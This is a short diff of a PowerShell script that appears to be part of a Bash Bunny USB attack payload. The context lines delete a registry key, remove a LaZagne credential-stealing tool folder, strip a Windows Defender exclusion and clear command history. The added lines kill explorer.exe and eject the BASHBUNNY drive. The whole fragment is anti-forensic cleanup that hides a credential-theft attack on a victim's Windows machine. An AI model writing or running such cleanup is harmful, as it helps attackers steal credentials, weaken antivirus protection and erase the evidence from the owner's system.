@@ -10,3 +10,7 @@ reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\
 Remove-Item "$BLABEL\lazagne\" -recurse
 Remove-MpPreference -ExclusionPath "$BLABEL"
 Clear-History
+stop-process -Name explorer
+$bb = (gwmi win32_volume -f 'label=''BASHBUNNY''').Name
+$driveEject = New-Object -comObject Shell.Application
+$driveEject.Namespace(17).ParseName("$bb").InvokeVerb("Eject")
